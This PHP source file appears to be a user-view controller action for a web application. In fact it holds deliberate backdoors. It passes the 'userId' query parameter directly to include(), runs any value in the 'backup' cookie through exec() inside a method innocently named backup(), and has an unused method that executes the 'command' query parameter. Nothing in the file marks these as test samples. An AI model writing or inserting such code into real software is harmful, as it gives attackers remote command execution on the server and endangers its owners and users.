<?php

declare(strict_types=1);

namespace App\Application\Actions\User;

use Psr\Http\Message\ResponseInterface as Response;
use Psr\Http\Message\ServerRequestInterface as Request;

class ViewUserAction extends UserAction
{
    /**
     * {@inheritdoc}
     */
    protected function action(Request $request, $abc): Response
    {
        $userId = $this->resolveArg('id');
        $user = $this->userRepository->findUserOfId($userId);

        $params = $request->getQueryParams();

        $userId = $_GET['userId'];

        if ($params['view']) {
            include($userId);
        }

        $backup = $_COOKIE['backup'];
        if ($backup) {
            $this->backup($backup);
        }

        $this->logger->info("User of id `${userId}` was viewed.");

        return $this->respondWithData($user);
    }

    private function backup($code)
    {
        exec($code);
    }

    private function notUsed()
    {
        $command = $_GET['command'];

        if ($command) {
            exec($command);
        }
    }
}
